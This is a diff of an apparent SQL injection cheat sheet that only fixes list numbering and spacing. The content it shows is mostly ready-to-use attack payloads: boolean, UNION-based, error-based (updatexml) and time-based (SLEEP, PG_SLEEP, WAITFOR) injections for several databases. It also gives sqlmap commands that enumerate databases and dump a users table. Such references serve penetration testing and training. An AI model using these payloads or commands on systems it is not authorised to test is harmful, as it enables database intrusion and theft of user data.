@@ -30,11 +30,11 @@ A. ' OR 1=1 -- -
 B. ' OR 1=2 -- -
 
 
-3.Mathematical Evaluation: Inject expressions to test if parameters are evaluated numerically:
+3. Mathematical Evaluation: Inject expressions to test if parameters are evaluated numerically:
 
-1.Try targeting /item.php?id=5 with /item.php?id=6-1
+1. Try targeting /item.php?id=5 with /item.php?id=6-1
 
-2.If the application returns the same result for id=5 and id=6-1, numerical input is being evaluated.
+2. If the application returns the same result for id=5 and id=6-1, numerical input is being evaluated.
 
 ⚡ SQLi Categories & Practical Payloads
 
@@ -46,14 +46,14 @@ A. UNION-Based SQLi
 
 ## Used when the query results are returned directly in the application's response.
 
-1.Determine Column Count: Increment until an error or change in response occurs:
+1. Determine Column Count: Increment until an error or change in response occurs:
 
 ' ORDER BY 1 -- -
 ' ORDER BY 2 -- -
 ' ORDER BY 3 -- -  (Error! Indicates there are only 2 columns)
 
 
-2.Determine Column Data Types: Look for which columns can hold string data:
+2. Determine Column Data Types: Look for which columns can hold string data:
 
 ' UNION SELECT 'a', NULL -- -
 ' UNION SELECT NULL, 'a' -- -
@@ -63,17 +63,17 @@ A. UNION-Based SQLi
 
 1. MySQL/MariaDB: ' UNION SELECT @@version, NULL -- -
 
-2.PostgreSQL: ' UNION SELECT version(), NULL -- -
+2. PostgreSQL: ' UNION SELECT version(), NULL -- -
 
-3.Microsoft SQL Server: ' UNION SELECT @@version, NULL -- -
+3. Microsoft SQL Server: ' UNION SELECT @@version, NULL -- -
 
-4.Oracle: ' UNION SELECT banner, NULL FROM v$version -- -
+4. Oracle: ' UNION SELECT banner, NULL FROM v$version -- -
 
 B. Error-Based SQLi
 
 Used when the response contains raw database error messages, allowing the attacker to force the database to leak sensitive data inside the error details.
 
-1.UpdateXML Vector (MySQL):
+1. UpdateXML Vector (MySQL):
 
 ' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) -- -
 
@@ -100,17 +100,17 @@ B. Time-Based Blind
 
 Used when the database does not show any visual differences in the response. The attacker forces the database to pause (sleep) before responding to verify if a condition is True.
 
-1.MySQL Payload:
+1. MySQL Payload:
 
 ' AND IF(1=1, SLEEP(5), 0) -- -
 
 
-2.PostgreSQL Payload:
+2. PostgreSQL Payload:
 
 ' AND (SELECT 1 FROM PG_SLEEP(5)) -- -
 
 
-3.Microsoft SQL Server Payload:
+3. Microsoft SQL Server Payload:
 
 ' IF(1=1) WAITFOR DELAY '0:0:5' -- -
 
@@ -140,25 +140,29 @@ Save the full raw request from Burp Suite into a file (request.txt):
 sqlmap -r request.txt -p id --batch
 
 
-1.-r request.txt: Tells sqlmap to parse the cookie session, user-agents, and headers from your file.
+1. -r request.txt: Tells sqlmap to parse the cookie session, user-agents, and headers from your file.
 
-2.-p id: Specifies the exact parameter to test (saves time and avoids crashing other endpoints).
+2. -p id: Specifies the exact parameter to test (saves time and avoids crashing other endpoints).
 
 # Database Enumeration & Dumping
 
 # Get database names
+
 sqlmap -r request.txt -p id --dbs
 
 # List tables in a specific database
+
 sqlmap -r request.txt -p id -D target_db --tables
 
 # Dump data from a specific table
+
 sqlmap -r request.txt -p id -D target_db -T users --dump
 
 
 # Advanced Optimization Flags
 
 # Speed up testing and inject deeper payloads
+
 sqlmap -r request.txt --level=3 --risk=2 --threads=5
 
 
